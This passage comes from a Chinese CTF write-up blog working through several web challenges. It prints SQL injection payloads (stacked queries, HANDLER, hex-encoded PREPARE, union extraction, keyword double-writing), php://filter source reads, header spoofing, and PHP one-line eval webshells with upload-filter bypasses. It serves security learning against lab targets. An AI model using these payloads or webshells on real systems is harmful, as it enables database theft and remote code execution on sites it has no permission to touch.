<p>发现只有id与data两个字段,应该不存在flag,继续看下一个表先。<br><img src="https://pic.imgdb.cn/item/653c984cc458853aefb9dd3d.jpg" alt="图二十六" title="堆叠爆字段"><br>注意:<br>对于纯数字的表名,要用``括起来<br>就是tableName是纯数字，需要用``包裹，比如<br>方式一:1’;desc `1919810931114514`;#<br>方式二:1’; show columns from `1919810931114514`;#<br>发现存在flag字段,就差一步了,加油。<br><img src="https://pic.imgdb.cn/item/653c9861c458853aefba4716.jpg" alt="图二十七" title="爆出存在flag的表"><br>最后读取这一步,又不会了,继续借鉴。<br>!!!该题目的查询语句很有可能是：select id,data from words where id &#x3D;，因为我们输入1，回显的是两个字段，这与words表符合，而1919810931114514表中只有一列,那怎么办呢。<br>4种方法:<br>1、多方了解,才想到改名,就是它的查询语句是selsect id,data from words where id &#x3D;,那么我们令原来的words表为另一个名字,而我们的目标1919810931114514这张表改为words,那么我们查询的时候,就会带入这个带有flag的表查询,从而爆出flag。<br>数据库知识:<br>修改表名：ALTER TABLE 旧表名 RENAME TO 新表名；<br>修改字段：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；<br>构造payload:把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id(或data)。</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;alter table <span class="built_in">words</span> rename <span class="keyword">to</span> words1;alter table `<span class="number">1919810931114514</span>` rename <span class="keyword">to</span> <span class="built_in">words</span>;alter table <span class="built_in">words</span> change flag <span class="built_in">id</span> varchar(<span class="number">50</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>这就实现了改名功能,只爆一个字段(id&#x2F;data)不影响,然后像刚开始那样子测试有无注入点那样,直接爆出flag。<br><img src="https://pic.imgdb.cn/item/653c986cc458853aefba7b6f.jpg" alt="图二十八" title="改名爆flag"><br>后面三种搬运一下,做知识总结。<br>2、handler函数。<br>handler不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：<br>打开表：HANDLER 表名 OPEN ;<br>查看数据： HANDLER 表名 READ next;<br>关闭表： HANDLER 表名 READ CLOSE;</p>
<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;HANDLER <span class="string">`1919810931114514`</span> OPEN;HANDLER <span class="string">`1919810931114514`</span> READ next;HANDLER <span class="string">`1919810931114514`</span> CLOSE;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>3、预编译方式<br>因为select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字：<br>预编译相当于定一个语句相同，参数不同的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤,格式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="keyword">PREPARE</span> 名称 <span class="keyword">FROM</span> <span class="keyword">Sql</span>语句 ? ;</span><br><span class="line"><span class="number">2</span>、<span class="keyword">SET</span> <span class="variable">@x</span><span class="operator">=</span>xx;</span><br><span class="line"><span class="keyword">EXECUTE</span> 名称 <span class="keyword">USING</span> <span class="variable">@x</span>;</span><br></pre></td></tr></table></figure>
<p>例子:</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span>;<span class="function">PREPARE hacker <span class="keyword">from</span> <span class="title">concat</span>(<span class="params"><span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;elect&#x27;</span>, <span class="string">&#x27; * from \`1919810931114514\` &#x27;</span></span>)</span>;EXECUTE  hacker;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">也可以将select * from \`<span class="number">1919810931114514</span>\`语句进行<span class="number">16</span>进制编码，即：<span class="number">0</span>x73656c656374202a2066726f6d2060313931393831303933313131343531346</span><br><span class="line"><span class="number">1</span>&#x27;;PREPARE ck from 0x<span class="number">7365</span>6c<span class="number">65637420</span>2a<span class="number">206672</span>6f6d<span class="number">20603139313938</span><span class="number">31303933313131</span><span class="number">3435313460</span>;EXECUTE  ck;#</span><br></pre></td></tr></table></figure>
<p>4、利用MySql预处理<br>使用条件：HANDLER也被过滤了。<br>在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用MySql预处理语句配合concat拼接来执行sql语句拿flag。<br>最后总结一句话:安全与开发缺一不可。<br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44640313/article/details/128308237">https://blog.csdn.net/qq_44640313/article/details/128308237</a></p>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>进入靶机,首先判断有无注入点。<br>输入1以上的int数据,发现有回显;而输入其他值则无回显。<br><img src="https://pic.imgdb.cn/item/65420741c458853aeff5cc1b.jpg" alt="图二十九" title="回显"><br><img src="https://pic.imgdb.cn/item/65420750c458853aeff5f3e6.jpg" alt="图三十" title="回显"><br>进一步测试,测试是数字型注入或者是字符行注入。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> <span class="number">1</span>=<span class="number">1#</span></span><br><span class="line"><span class="symbol">1 </span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1#</span></span><br><span class="line"><span class="number">1</span><span class="comment">&#x27; and 1=1#</span></span><br><span class="line"><span class="number">1</span><span class="comment">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>
<p>这些payload全都测试过了,无一例外,全都回显nonono。<br><img src="https://pic.imgdb.cn/item/6542078ac458853aeff685d1.jpg" alt="图三十一" title="发现存在过滤"><br>说明存在and过滤|输出nonono说明存在过滤,存在对某一个字符串的过滤。<br>既然存在注入,连盲注都不能测试了,因为盲注语句也用到and&#x2F;or&#x2F;updatexml等。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>=xiaodi&#x27;or updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,version(),<span class="number">0</span>x7e),<span class="number">0</span>) or&#x27;&amp;password=<span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>那就只能尝试堆叠注入了。<br>输入payload:</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="comment">;show databases;</span></span><br></pre></td></tr></table></figure>
<p>成功爆出数据库。<br><img src="https://pic.imgdb.cn/item/65420797c458853aeff6a7d3.jpg" alt="图三十二" title="爆库"><br>接着爆表。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654207a6c458853aeff6cf7e.jpg" alt="图三十三" title="爆表"><br>再尝试爆表的字段</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> FLAG;</span><br></pre></td></tr></table></figure>
<p>输出nonono,发现对flag存在过滤。<br>到这里,思路戛然而止,暂停略微参考一下wp。<br>接下来回顾一下最开始我们输入的非0数字和0与字母所回显的内容：非0数字回显1,0和字母不会回显任何内容<br>先了解一下||操作符：<br>在MySQL中，操作符||表示“或”逻辑：<br>command1 || command2<br>c1和c2其中一侧为1则取1，否则取0<br> 这里猜测后端语句，因为只有当我们输入非零数字时才会会显出1，而0和其他全都无回显,而猜测逻辑大致是这样的：大胆猜测后端（内部查询语句）语句中有||操作符，只有我们输入非零数字才会满足||的逻辑为True从而进行回显的条件。也就是满足:select 输入的内容 ||  一个列名 from 表名。（select 输入数据 || flag from Flag）<br>确实很大胆.真的没想到ctf的题会这样考,利用mysql的’||’的逻辑把flag藏到后面,有回显但是回显’||’前面判断为真或假的值,以这样的方式藏flag。<br>那么这样的话,构造payload,就把mysql中’||’的逻辑改成连接的逻辑:</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="built_in">set</span> <span class="attribute">sql_mode</span>=PIPES_AS_CONCAT;select 1</span><br><span class="line">注：</span><br><span class="line">(mssql中的<span class="string">&#x27;||&#x27;</span>就是连接的逻辑)</span><br><span class="line">1、这里需要借用到：设置 <span class="attribute">sql_mode</span>=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置）。</span><br><span class="line">2、这里的逻辑是先把||转换为连接操作符，注意分号隔断了前面的命令，所以要再次添加select来进行查询，这里把1换成其他非零数字也一样会回显flag。</span><br></pre></td></tr></table></figure>
<p>这样就可获取到flag。<br><img src="https://pic.imgdb.cn/item/654207b5c458853aeff6f5a1.jpg" alt="图三十四" title="修改mysql的&#39;||&#39;的逻辑爆flag"><br>参考:<code>https://blog.csdn.net/m0_62851980/article/details/124083026</code><br>总结出一套做sql注入的思路<br>1、先判断有无注入点:把字符全试一遍,看看有无规律,找出其逻辑;<br>   再用and&#x2F;or进一步判断;<br>2、再爆列数;<br>3、联合查询,先爆库,再爆表,再爆字段,最后爆数据;<br>4、若存在select等过滤,用到报错盲注或堆叠注入。</p>
<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>打开靶机,显示xxx的秘密,我不关心,我只关心zhaoflag然后吃西瓜。<br>看源码,有一个超链接,点开看一下,发现跳转到另一个界面,有一个大大的SELECT;点击进去,来到一个看起来是最后一个界面的界面,抓包看一下<br>发现一个文件<br><img src="https://pic.imgdb.cn/item/65421219c458853aef12072f.jpg" alt="图三十五" title="我只会吃西瓜"><br>跳转过去,发现flag所处位置以及文件的接收方式是以file作为属性接收的,且以get方式提交。<br><img src="https://pic.imgdb.cn/item/65421235c458853aef124699.jpg" alt="图三十六" title="serc3t的内容(这是一个关键的文件)"><br>进入flag.php,发现是一场空欢喜。<br><img src="https://pic.imgdb.cn/item/654212dec458853aef13d351.jpg" alt="图三十七" title="空欢喜"><br>看不到flag,那么就又要考虑到php伪协议。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure>
<p>看到flag。<br><img src="https://pic.imgdb.cn/item/654212e4c458853aef13e159.jpg" alt="图三十八" title="php伪协议获取base64编码的flag"><br>看编码形式像base64编码,解码即可。得到flag。<br><img src="https://pic.imgdb.cn/item/654212f1c458853aef140081.jpg" alt="图三十九" title="解码得到flag"></p>
<p><code>!!!发现php伪协议配合文件包含挺多的。学习一下php伪协议。</code></p>
<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>1、配合文件读取,即网址栏含有?file&#x3D;或?filename&#x3D;诸如此类的字段–前提<br>2、再配合文件包含,即猜测其代码存在include某一个文件–关键<br>3、这样,即可尝试使用php伪协议读取那个文件。<br>常用payload(做题暂只遇到这一种):</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>xxx.xxx.xxx<span class="regexp">/index.php?filename=php:/</span><span class="regexp">/filter/</span>read=convert.base64-encode/resource=xxx.php</span><br><span class="line">作用:读取当前文件包含的文件。</span><br></pre></td></tr></table></figure>
<p>推荐阅读(详细讲解):<br><code>https://www.php.cn/faq/481803.html</code><br><code>https://blog.csdn.net/qq_37466661/article/details/126203437</code><br><code>https://blog.csdn.net/m0_56107268/article/details/127760614</code><br>但也存在限制,具体的限制看我的博客:<code>https://fzsecurity-github.github.io/2023/10/14/wenjianbaohan/?highlight=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB</code></p>
<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>嗯,我很爱sql……<br>进入靶机,是一个登陆界面,首先正常输入账号密码,嗯,返回一个账号密码错误的界面。那么测试有无注入点。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> <span class="number">1</span>=<span class="number">1#</span></span><br><span class="line"><span class="symbol">1 </span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1#</span></span><br><span class="line"><span class="number">1</span><span class="comment">&#x27; and 1=1#</span></span><br><span class="line"><span class="number">1</span><span class="comment">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>
<p>其中,在账号栏一行中输入1’ or 1&#x3D;1#而且密码栏随便输入(以为存在先判断密码栏是否为空,再判断账号密码是否对上),发现即使不输入密码也显示出来信息。<br><img src="https://pic.imgdb.cn/item/65427681c458853aef667be3.jpg" alt="图四十" title="测试有无注入点时直接获取一个信息"><br>思考,我刚开始以为是某种编码,但是尝试了很多种编码的解码,一一失败,判定为乱码,那么只能进一步注入。<br>前期知道为字符型get注入,那么先判定字段数。<br>首先测试3字段,发现正常报错(输出查询异常信息);但是输入4的时候直接报错显示不存在4这个字段。即判定3字段。</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span><span class="comment">#;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span><span class="comment">#;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65427699c458853aef66db16.jpg" alt="图四十一" title="4列报错"><br><img src="https://pic.imgdb.cn/item/654276a5c458853aef670c4b.jpg" alt="图四十二" title="3行正常"><br>随后显示具体字段在哪个位置爆出<br>payload(密码随便填)：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654276cfc458853aef67f284.jpg" alt="图四十三" title="知道爆数据的位置"><br><code>这里有一个注意点:</code><br><code>经过测试,猜测该网站的后台代码会对接受过来的数据进行一次url解码,所以你在url栏输入payload时,你要进行url编码再填充进去。</code><br><code>如果你直接在账号输入栏测试则不需要。</code><br>好了,开始ggboom。<br>首先爆一些数据库名字,版本的相关信息。</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>(),<span class="built_in">version</span>()<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6543096cc458853aef746dc3.jpg" alt="图四十四" title="爆数据库基本信息"><br>然后,可以尝试使用mysql注入的思路,先判断mariaDB是否存在关键的几张表。<br><img src="https://pic.imgdb.cn/item/654309a5c458853aef74ec96.jpg" alt="图四十五" title="选择思路"><br>那么可以使用注入mysql数据库的思路。<br>爆库(可省略)</p>
<figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654309c5c458853aef753670.jpg" alt="图四十六" title="爆库"><br>爆表</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;geek&#x27;</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654309d7c458853aef756b74.jpg" alt="图四十七" title="爆表"><br>爆字段(先爆l0ve1ysq1这张表,再爆geekuser这张表)</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;l0ve1ysq1&#x27;</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;geekuser&#x27;</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>发现字段都一样<br><img src="https://pic.imgdb.cn/item/654309e1c458853aef758713.jpg" alt="图四十八" title="爆字段"><br>那么爆字段值(数据)吧</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; union select <span class="number">1</span>,group<span class="constructor">_concat(<span class="params">username</span>)</span>,group<span class="constructor">_concat(<span class="params">password</span>)</span> from geekuser#</span><br></pre></td></tr></table></figure>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; union select <span class="number">1</span>,group<span class="constructor">_concat(<span class="params">username</span>)</span>,group<span class="constructor">_concat(<span class="params">password</span>)</span> from l0ve1ysq1#</span><br></pre></td></tr></table></figure>
<p> geekuser表中数据为<br> <img src="https://pic.imgdb.cn/item/654309fec458853aef75d16e.jpg" alt="图四十九" title="爆数据(字段)--geekuser"><br> geekuser的数据还是乱码,解析不了。那么寄希望于下一张表,l0ve1ysq1表中数据为<br> <img src="https://pic.imgdb.cn/item/65430a0fc458853aef75f9aa.jpg" alt="图五十" title="爆数据(字段)--l0ve1ysq1"><br>看不全,查看源码,获取flag<br> <img src="https://pic.imgdb.cn/item/65430a1ec458853aef761bbd.jpg" alt="图五十一" title="获取flag"><br> 总算是一道正常的没有堆叠的注入题了…嗯,lovesql。</p>
<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>打开靶机,界面是一个正常的网页,第一件事先看源码,发现确实有一个.php文件可以访问。<br><img src="https://pic.imgdb.cn/item/654317b9c458853aef96c798.jpg" alt="图五十二" title="发现关键key"><br>尝试访问,发现是一个warning,提示来源(Referer)必须是<a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a><br><img src="https://pic.imgdb.cn/item/65431865c458853aef9861b9.jpg" alt="图五十三" title="warning"><br>抓包修改,wp说:<code>这里有一个注意点，那就是你加的Referer字段必须在connection字段下面,不然会报错</code> –为什么,就算没在下面也可以<br><img src="https://pic.imgdb.cn/item/65431882c458853aef98a7ac.jpg" alt="图五十四" title="改包"><br>提示要使用浏览器Syclover,那么在user-agent字段修改<br><img src="https://pic.imgdb.cn/item/654318dbc458853aef996b19.jpg" alt="图五十五" title="二次改包"><br>提示要本地访问,那么添加一个X-Forwarded-For字段,值为127.0.0.1即可获取flag<br><img src="https://pic.imgdb.cn/item/65431904c458853aef99cb0d.jpg" alt="图五十六" title="改包获取flag"><br><code>(建议康康)关于数据包的一些讲解:https://blog.csdn.net/qq_63548648/article/details/128083782</code></p>
<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>打开靶机,提示菜刀不见了,还给了一句话木马,推测其网站下的目录存在有包含这个一句话木马的文件。想都不用想,连接上去就完事了。<br><img src="https://pic.imgdb.cn/item/65435b00c458853aef573dbc.jpg" alt="图五十七" title="看到一句话木马,直接连接"><br>点击测试连接,提示连接成功,成功getshell,就可getflag。<br><img src="https://pic.imgdb.cn/item/65435b11c458853aef576820.jpg" alt="图五十八" title="getshell|getflag"><br>这么简单?不可置信,看了看源码,嗯果然是白给的shell…</p>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>开启靶机,发现是一个标准的文件上传的界面(挺好看的感觉)。<br>e,说回正题,我们先尝试直接上传.php文件看能不能一发入魂。<br><img src="https://pic.imgdb.cn/item/654afb56c458853aef788d76.jpg"><br>显然不能,存在过滤。<br>那么接下来我们就要思考如何实现绕过,上传包含一句话木马的文件,直接getshell。<br><code>MIME值绕过</code><br>抓包把MIME(Content-Type)的值改为正常的图片形式。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">image/png</span><br><span class="line">image/jpg</span><br></pre></td></tr></table></figure>
<p>还是可以识别出来,pass。<br><img src="https://pic.imgdb.cn/item/654b0dc4c458853aefa98ee0.jpg"><br><code>大小写混写</code><br>亲测,不可以实现绕过。<br><code>php双写|把后缀直接改为php5、phtml等格式</code><br>可以绕过对于文件名的过滤,那么判断文件后缀检验方式为黑名单检测。<br>但是对文件内容&lt;?存在过滤。<br><img src="https://z1.ax1x.com/2023/11/08/pi1hxTs.jpg"><br>接下来思考:<code>如何绕过网站对文件内容的检测</code><br>那是不是有这样的思路:<code>既然你对php的标记有检测,那我可不可以使用php+java混编实现绕过?</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;111&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>但是发现还是绕过不了。<br><img src="https://pic.imgdb.cn/item/654b5c94c458853aefa8a4d3.jpg"><br>说明服务器不仅对前端进行了过滤，还对后端文件内容头做了校验。这里我们只能用文件幻术头来绕过试试。<br><code>GIF89a-文件幻术头绕过</code><br>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年5月发行），但在Web上所见到的大多数图形都是以89a版的格式创建的。 89a版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。<br>这里上传成功了,但是双写好像不行,推测它对文件名的遍历方式是记录前面的值,取这个全部遍历完后的值与黑名单匹配。那么浏览器可能解析不了,只能把后缀改为.phtml。<br><img src="https://pic.imgdb.cn/item/654b5cd7c458853aefa94b35.jpg"><br><img src="https://pic.imgdb.cn/item/654b5cf9c458853aefa9adb8.jpg"><br>上传成功后,那么就连接木马了。但这里,没有给出目录。<code>做题做多了,这种ctf一般不会太恶心,猜测存放上传文件的文件夹目录为upload</code><br>连接成功<br><img src="https://pic.imgdb.cn/item/654b5d46c458853aefaaa63e.jpg"><br>接下来就是愉快的找flag环节啦!<br>一般都在根目录下。成功获取flag。<br><img src="https://pic.imgdb.cn/item/654b5d60c458853aefaaf882.jpg"><br>from:<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_49025459/article/details/124723482">https://blog.csdn.net/m0_49025459/article/details/124723482</a></p>
<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>挺简单,讲下思路,有一个点要注意。<br>开启靶机,将鼠标移动至中间,发现一个文件上传的功能。<br>1、直接开干,直接上传含有一句话的木马文件,发现存在白名单检测。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>这里我直接抓包,但是发现抓不了包,无奈我只好只用浏览器自带的抓包工具尝试是不是我的bp配置有问题,结果这一抓,让我发现了一个main.js文件,原来是前端验证,好说直接禁用js即可</code><br>2、禁用js后,继续上传木马,发现还是存在过滤,那么这里存在的是后端的过滤,这时候可以抓包了,抓包尝试绕过。<br>3、MIME绕过,更改为图片格式,还是被拦截。<br>4、文件后缀名绕过,改为php5、phtml一个一个试哪一个可以被对方网站解析,经检测,发现只有phtml这个后缀可以，<br>5、直接上传成功,蚁剑连接即可。</p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>这道题值得我好好记录一下,因为好久没练过sql(而且还存在过滤)了。<br>打开靶机,是一道正常的sql注入题目。<br><code>1、首先判断是字符型还是数字型</code><br><code>用户名输入1&#39;,如果是字符型,会报如下错误</code><br>注意红框外面的’是自带的，并不是查询语句的内容。<br><img src="https://pic.imgdb.cn/item/654cc37ac458853aef7b7321.jpg"><br><code>如果是数字型,则会爆3个单引号(数字被正常接收)</code><br><code>get一个小姿势:1、and一般用于判断是字符型还是数字型;2、or常用来作万能密码</code><br><code>2、判断是否存在注入点以及是否存在过滤</code></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先: 1<span class="string">&#x27; or 1=1# --&gt;正常</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="attribute">1</span>=2# --&gt;爆错</span><br></pre></td></tr></table></figure>
<p>判断对or存在过滤(匹配到’or’,自动替换为空)–为什么可以判断对or存在过滤?？<br><code>首先#后的&#39;是没有闭合前的符号,刚开始我以为是对#存在过滤,但是如下图发现1=2#前少了个or,说明是对or存在过滤</code><br><img src="https://pic.imgdb.cn/item/654cc38ac458853aef7ba3af.jpg"><br>那就双写,成功绕过过滤。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; oorr <span class="number">1</span>=<span class="number">2</span>#</span><br></pre></td></tr></table></figure>
<p><code>！由于知道会把or替换为空,那么后续我们均可以以这个思路绕过对其他关键字的过滤。</code><br><code>3、接着判断列数</code></p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; oorrder <span class="keyword">by</span> <span class="number">4</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>发现对by也存在过滤,那就在by中间插入or即可(原因是它应该是正则去匹配的,且只匹配一次,那我就第一次不让他匹配到即可)。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; oorrder bory <span class="number">4</span>(<span class="number">3</span>)#</span><br></pre></td></tr></table></figure>
<p>判断列数为3列。<br><code>4、爆数据库名字</code><br>先判断在1、2、3的哪个位置爆出数据。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; unioorn seleorct <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure>
<p>爆数据库名字</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; unioorn seleorct <span class="number">1</span>,database(),<span class="number">3</span>#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654cc3e0c458853aef7ca092.jpg"><br><code>5、爆表</code></p>
